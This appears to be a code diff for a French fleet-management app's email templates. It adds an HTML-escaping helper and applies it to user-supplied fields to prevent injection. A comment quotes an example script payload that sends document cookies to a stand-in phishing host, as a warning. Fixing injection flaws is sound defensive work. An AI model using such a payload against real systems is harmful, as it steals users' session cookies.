@@ -41,11 +41,32 @@ interface EmailDocument {
 // CONFIGURATION
 // ============================================================================
 
-const APP_URL = import.meta.env.VITE_APP_URL || '${APP_URL}';
+// Fallback corrigé : avant on avait `'${APP_URL}'` (string littérale) qui se
+// retrouvait tel quel dans les liens "Voir dans FleetGenius" quand VITE_APP_URL
+// n'était pas défini → bouton cassé en prod.
+const APP_URL = import.meta.env.VITE_APP_URL || 'https://delivrex.vercel.app';
 
 // ============================================================================
 // HELPERS
 // ============================================================================
+
+/**
+ * Échappe les caractères HTML pour empêcher l'injection JS/HTML dans les emails.
+ * Toute interpolation ${...} de contenu utilisateur (description, nom, message...)
+ * DOIT passer par esc() avant d'être insérée dans un template HTML.
+ *
+ * Exemple sans esc() : un chauffeur tape `<script>fetch('phish.com?'+document.cookie)</script>`
+ * dans une description d'incident → l'email à l'admin exécute le JS au rendu.
+ */
+const esc = (value: unknown): string => {
+  if (value === null || value === undefined) return '';
+  return String(value)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+};
 
 const formatDate = (dateStr: string): string => {
   return new Date(dateStr).toLocaleDateString('fr-FR', { 
@@ -192,38 +213,38 @@ export const sendIncidentCreatedEmail = async (
       <div class="info-box">
         <div class="info-row">
           <span class="info-label">Véhicule</span>
-          <span class="info-value">${vehicle.plate} - ${vehicle.model}</span>
+          <span class="info-value">${esc(vehicle.plate)} - ${esc(vehicle.model)}</span>
         </div>
         <div class="info-row">
           <span class="info-label">Signalé par</span>
-          <span class="info-value">${reporter.firstName} ${reporter.lastName}</span>
+          <span class="info-value">${esc(reporter.firstName)} ${esc(reporter.lastName)}</span>
         </div>
         <div class="info-row">
           <span class="info-label">Date</span>
           <span class="info-value">${formatDateTime(issue.date)}</span>
         </div>
       </div>
-      
+
       <h3 style="margin-top: 24px;">Description du problème</h3>
       <div class="info-box">
-        <p style="margin: 0;">${issue.description}</p>
+        <p style="margin: 0;">${esc(issue.description)}</p>
       </div>
-      
+
       ${issue.photos && issue.photos.length > 0 ? `
         <p style="color: #64748b; font-size: 14px;">
           📷 ${issue.photos.length} photo(s) jointe(s) - Consultez l'application pour les voir
         </p>
       ` : ''}
-      
+
       <div style="text-align: center;">
-        <a href="${APP_URL}" class="button">Voir dans FleetGenius</a>
+        <a href="${esc(APP_URL)}" class="button">Voir dans FleetGenius</a>
       </div>
     </div>
   `;
 
   return sendEmail(
     recipients,
-    `🚨 [${priorityLabel}] Incident - ${vehicle.plate}`,
+    `🚨 [${priorityLabel}] Incident - ${esc(vehicle.plate)}`,
     content,
     { type: 'incident_created' }
   );
@@ -246,21 +267,21 @@ export const sendIncidentResponseEmail = async (
       <p>Votre incident a été pris en charge</p>
     </div>
     <div class="content">
-      <p>Bonjour ${driverName},</p>
-      
-      <p>Concernant votre signalement sur le véhicule <strong>${vehicle.plate}</strong> :</p>
-      
+      <p>Bonjour ${esc(driverName)},</p>
+
+      <p>Concernant votre signalement sur le véhicule <strong>${esc(vehicle.plate)}</strong> :</p>
+
       ${appointmentDate ? `
         <div class="alert alert-warning">
           <strong>📅 Date d'immobilisation prévue :</strong><br>
           ${formatDate(appointmentDate)}
         </div>
       ` : ''}
-      
+
       <div class="info-box">
-        <p style="margin: 0; font-style: italic;">"${responseMessage}"</p>
+        <p style="margin: 0; font-style: italic;">"${esc(responseMessage)}"</p>
       </div>
-      
+
       <p style="color: #64748b; font-size: 14px;">
         Vous serez notifié dès que le problème sera résolu.
       </p>
@@ -269,9 +290,9 @@ export const sendIncidentResponseEmail = async (
 
   return sendEmail(
     driverEmail,
-    appointmentDate 
-      ? `📅 RDV Atelier - ${vehicle.plate} - ${formatDate(appointmentDate)}`
-      : `💬 Réponse incident - ${vehicle.plate}`,
+    appointmentDate
+      ? `📅 RDV Atelier - ${esc(vehicle.plate)} - ${formatDate(appointmentDate)}`
+      : `💬 Réponse incident - ${esc(vehicle.plate)}`,
     content,
     { type: 'incident_response' }
   );
@@ -293,22 +314,22 @@ export const sendIncidentClosedEmail = async (
       <p>Votre véhicule est prêt</p>
     </div>
     <div class="content">
-      <p>Bonjour ${driverName},</p>
-      
+      <p>Bonjour ${esc(driverName)},</p>
+
       <div class="alert alert-success">
         <strong>Bonne nouvelle !</strong><br>
-        L'incident sur votre véhicule <strong>${vehicle.plate}</strong> a été résolu.
+        L'incident sur votre véhicule <strong>${esc(vehicle.plate)}</strong> a été résolu.
       </div>
-      
+
       <h3>Détails de l'intervention</h3>
       <div class="info-box">
-        <p style="margin: 0;">${closingComment}</p>
+        <p style="margin: 0;">${esc(closingComment)}</p>
       </div>
-      
+
       <div class="info-box">
         <div class="info-row">
           <span class="info-label">Problème initial</span>
-          <span class="info-value">${issue.description.slice(0, 50)}...</span>
+          <span class="info-value">${esc((issue.description || '').slice(0, 50))}...</span>
         </div>
         <div class="info-row">
           <span class="info-label">Signalé le</span>
@@ -324,7 +345,7 @@ export const sendIncidentClosedEmail = async (
 
   return sendEmail(
     driverEmail,
-    `✅ Incident résolu - ${vehicle.plate}`,
+    `✅ Incident résolu - ${esc(vehicle.plate)}`,
     content,
     { type: 'incident_closed' }
   );
@@ -351,11 +372,11 @@ export const sendLeaveRequestEmail = async (
       <div class="info-box">
         <div class="info-row">
           <span class="info-label">Employé</span>
-          <span class="info-value">${employee.firstName} ${employee.lastName}</span>
+          <span class="info-value">${esc(employee.firstName)} ${esc(employee.lastName)}</span>
         </div>
         <div class="info-row">
           <span class="info-label">Type</span>
-          <span class="info-value">${getAbsenceTypeLabel(absence.type)}</span>
+          <span class="info-value">${esc(getAbsenceTypeLabel(absence.type))}</span>
         </div>
         <div class="info-row">
           <span class="info-label">Du</span>
@@ -370,23 +391,23 @@ export const sendLeaveRequestEmail = async (
           <span class="info-value">${absence.workingDays} jour(s) ouvré(s)</span>
         </div>
       </div>
-      
+
       ${absence.reason ? `
         <h3>Motif</h3>
         <div class="info-box">
-          <p style="margin: 0;">${absence.reason}</p>
+          <p style="margin: 0;">${esc(absence.reason)}</p>
         </div>
       ` : ''}
-      
+
       <div style="text-align: center;">
-        <a href="${APP_URL}" class="button">Valider / Refuser</a>
+        <a href="${esc(APP_URL)}" class="button">Valider / Refuser</a>
       </div>
     </div>
   `;
 
   return sendEmail(
     approverEmails,
-    `📅 Demande de congés - ${employee.firstName} ${employee.lastName} (${absence.workingDays}j)`,
+    `📅 Demande de congés - ${esc(employee.firstName)} ${esc(employee.lastName)} (${absence.workingDays}j)`,
     content,
     { type: 'leave_request' }
   );
@@ -406,13 +427,13 @@ export const sendLeaveApprovedEmail = async (
       <p>Votre demande a été acceptée</p>
     </div>
     <div class="content">
-      <p>Bonjour ${employee.firstName},</p>
-      
+      <p>Bonjour ${esc(employee.firstName)},</p>
+
       <div class="alert alert-success">
         <strong>Bonne nouvelle !</strong><br>
-        Votre demande de ${getAbsenceTypeLabel(absence.type)} a été validée.
+        Votre demande de ${esc(getAbsenceTypeLabel(absence.type))} a été validée.
       </div>
-      
+
       <div class="info-box">
         <div class="info-row">
           <span class="info-label">Du</span>
@@ -428,7 +449,7 @@ export const sendLeaveApprovedEmail = async (
         </div>
         <div class="info-row">
           <span class="info-label">Validé par</span>
-          <span class="info-value">${approverName}</span>
+          <span class="info-value">${esc(approverName)}</span>
         </div>
       </div>
       
@@ -461,21 +482,21 @@ export const sendLeaveRejectedEmail = async (
       <p>Votre demande n'a pas pu être acceptée</p>
     </div>
     <div class="content">
-      <p>Bonjour ${employee.firstName},</p>
-      
+      <p>Bonjour ${esc(employee.firstName)},</p>
+
       <div class="alert alert-danger">
-        Votre demande de ${getAbsenceTypeLabel(absence.type)} du <strong>${formatDate(absence.startDate)}</strong> au <strong>${formatDate(absence.endDate)}</strong> a été refusée.
+        Votre demande de ${esc(getAbsenceTypeLabel(absence.type))} du <strong>${formatDate(absence.startDate)}</strong> au <strong>${formatDate(absence.endDate)}</strong> a été refusée.
       </div>
-      
+
       ${reason ? `
         <h3>Motif du refus</h3>
         <div class="info-box">
-          <p style="margin: 0;">${reason}</p>
+          <p style="margin: 0;">${esc(reason)}</p>
         </div>
       ` : ''}
-      
+
       <p style="color: #64748b; font-size: 14px;">
-        N'hésitez pas à contacter ${approverName} pour plus d'informations ou pour proposer d'autres dates.
+        N'hésitez pas à contacter ${esc(approverName)} pour plus d'informations ou pour proposer d'autres dates.
       </p>
     </div>
   `;
@@ -505,9 +526,9 @@ export const sendLeaveModificationProposalEmail = async (
       <p>De nouvelles dates vous sont proposées pour vos congés</p>
     </div>
     <div class="content">
-      <p>Bonjour ${employee.firstName},</p>
+      <p>Bonjour ${esc(employee.firstName)},</p>
 
-      <p><strong>${proposerName}</strong> vous propose de modifier les dates de votre demande de ${getAbsenceTypeLabel(absence.type)} :</p>
+      <p><strong>${esc(proposerName)}</strong> vous propose de modifier les dates de votre demande de ${esc(getAbsenceTypeLabel(absence.type))} :</p>
 
       <div class="info-box">
         <div class="info-row">
@@ -523,7 +544,7 @@ export const sendLeaveModificationProposalEmail = async (
 
       <h3>Motif de la modification</h3>
       <div class="info-box">
-        <p style="margin: 0;">${reason}</p>
+        <p style="margin: 0;">${esc(reason)}</p>
       </div>
 
       <p style="color: #64748b; font-size: 14px;">
@@ -531,7 +552,7 @@ export const sendLeaveModificationProposalEmail = async (
       </p>
 
       <div style="text-align: center;">
-        <a href="${APP_URL}" class="button">Voir la proposition</a>
+        <a href="${esc(APP_URL)}" class="button">Voir la proposition</a>
       </div>
     </div>
   `;
@@ -574,16 +595,16 @@ export const sendCTAlertEmail = async (
       <div class="info-box">
         <div class="info-row">
           <span class="info-label">Véhicule</span>
-          <span class="info-value">${vehicle.plate} - ${vehicle.model}</span>
+          <span class="info-value">${esc(vehicle.plate)} - ${esc(vehicle.model)}</span>
         </div>
         <div class="info-row">
           <span class="info-label">Date CT</span>
           <span class="info-value">${vehicle.technicalControlDate ? formatDate(vehicle.technicalControlDate) : 'Non renseignée'}</span>
         </div>
       </div>
-      
+
       <p style="color: #64748b; font-size: 14px;">
-        ${isExpired 
+        ${isExpired
           ? 'Ce véhicule ne doit plus circuler jusqu\'à régularisation.'
           : 'Merci de planifier le contrôle technique rapidement.'
         }
@@ -593,7 +614,7 @@ export const sendCTAlertEmail = async (
 
   return sendEmail(
     recipients,
-    `${isExpired ? '🚫' : '⚠️'} CT ${isExpired ? 'expiré' : `dans ${daysRemaining}j`} - ${vehicle.plate}`,
+    `${isExpired ? '🚫' : '⚠️'} CT ${isExpired ? 'expiré' : `dans ${daysRemaining}j`} - ${esc(vehicle.plate)}`,
     content,
     { type: 'ct_alert' }
   );
@@ -603,7 +624,7 @@ export const sendCTAlertEmail = async (
  * Email d'alerte pour permis expiré ou proche expiration
  */
 export const sendLicenseAlertEmail = async (
-  driver: User,
+  driver: User & { licenseExpiry?: string },
   daysRemaining: number,
   recipients: string[]
 ): Promise<boolean> => {
@@ -625,16 +646,16 @@ export const sendLicenseAlertEmail = async (
       <div class="info-box">
         <div class="info-row">
           <span class="info-label">Chauffeur</span>
-          <span class="info-value">${driver.firstName} ${driver.lastName}</span>
+          <span class="info-value">${esc(driver.firstName)} ${esc(driver.lastName)}</span>
         </div>
         <div class="info-row">
           <span class="info-label">Date d'expiration</span>
           <span class="info-value">${driver.licenseExpiry ? formatDate(driver.licenseExpiry) : 'Non renseignée'}</span>
         </div>
       </div>
-      
+
       <p style="color: #64748b; font-size: 14px;">
-        ${isExpired 
+        ${isExpired
           ? 'Ce chauffeur ne doit plus conduire jusqu\'à régularisation.'
           : 'Merci de rappeler au chauffeur de renouveler son permis.'
         }
@@ -644,7 +665,7 @@ export const sendLicenseAlertEmail = async (
 
   return sendEmail(
     recipients,
-    `${isExpired ? '🚫' : '⚠️'} Permis ${isExpired ? 'expiré' : `dans ${daysRemaining}j`} - ${driver.firstName} ${driver.lastName}`,
+    `${isExpired ? '🚫' : '⚠️'} Permis ${isExpired ? 'expiré' : `dans ${daysRemaining}j`} - ${esc(driver.firstName)} ${esc(driver.lastName)}`,
     content,
     { type: 'license_alert' }
   );
@@ -708,42 +729,42 @@ export const sendUserInvitationEmail = async (
       <p>Vous avez été invité(e) à rejoindre la plateforme</p>
     </div>
     <div class="content">
-      <p>Bonjour ${newUser.firstName},</p>
-      
-      <p><strong>${invitedBy.firstName} ${invitedBy.lastName}</strong> vous a invité(e) à rejoindre FleetGenius Pro, la plateforme de gestion de flotte.</p>
-      
+      <p>Bonjour ${esc(newUser.firstName)},</p>
+
+      <p><strong>${esc(invitedBy.firstName)} ${esc(invitedBy.lastName)}</strong> vous a invité(e) à rejoindre FleetGenius Pro, la plateforme de gestion de flotte.</p>
+
       <div class="info-box">
         <div class="info-row">
           <span class="info-label">Votre compte</span>
-          <span class="info-value">${newUser.email}</span>
+          <span class="info-value">${esc(newUser.email)}</span>
         </div>
         <div class="info-row">
           <span class="info-label">Votre rôle</span>
-          <span class="info-value">${newUser.role}</span>
+          <span class="info-value">${esc(newUser.role)}</span>
         </div>
       </div>
-      
+
       <div style="text-align: center; margin: 32px 0;">
-        <a href="${activationUrl}" class="button" style="font-size: 18px; padding: 18px 40px; background: linear-gradient(135deg, #10b981 0%, #059669 100%);">
+        <a href="${esc(activationUrl)}" class="button" style="font-size: 18px; padding: 18px 40px; background: linear-gradient(135deg, #10b981 0%, #059669 100%);">
           🚀 Activer mon compte
         </a>
       </div>
-      
+
       <div class="alert alert-warning">
-        <strong>⏰ Important :</strong> Ce lien est valide jusqu'au <strong>${expirationDate}</strong>.<br>
+        <strong>⏰ Important :</strong> Ce lien est valide jusqu'au <strong>${esc(expirationDate)}</strong>.<br>
         Passé ce délai, vous devrez demander une nouvelle invitation.
       </div>
-      
+
       <h3>Comment ça marche ?</h3>
       <ol style="color: #64748b; font-size: 14px; line-height: 1.8;">
         <li>Cliquez sur le bouton vert <strong>"Activer mon compte"</strong></li>
         <li>Créez votre mot de passe personnel (6 caractères minimum)</li>
         <li>C'est terminé ! Vous serez connecté automatiquement</li>
       </ol>
-      
+
       <p style="color: #94a3b8; font-size: 12px; margin-top: 24px; padding-top: 16px; border-top: 1px solid #e2e8f0;">
         Si le bouton ne fonctionne pas, copiez ce lien dans votre navigateur :<br>
-        <a href="${activationUrl}" style="color: #3b82f6; word-break: break-all;">${activationUrl}</a>
+        <a href="${esc(activationUrl)}" style="color: #3b82f6; word-break: break-all;">${esc(activationUrl)}</a>
       </p>
     </div>
   `;
@@ -768,18 +789,18 @@ export const sendPasswordResetRequestEmail = async (
       <p>Une demande a été effectuée pour votre compte</p>
     </div>
     <div class="content">
-      <p>Bonjour ${user.firstName},</p>
-      
+      <p>Bonjour ${esc(user.firstName)},</p>
+
       <p>Une demande de réinitialisation de mot de passe a été effectuée pour votre compte FleetGenius.</p>
-      
+
       <div class="alert alert-warning">
         Si vous n'êtes pas à l'origine de cette demande, vous pouvez ignorer cet email.
       </div>
-      
+
       <p>Pour réinitialiser votre mot de passe, rendez-vous sur la page de connexion et cliquez sur "Mot de passe oublié".</p>
-      
+
       <div style="text-align: center;">
-        <a href="${APP_URL}" class="button">Accéder à FleetGenius</a>
+        <a href="${esc(APP_URL)}" class="button">Accéder à FleetGenius</a>
       </div>
     </div>
   `;
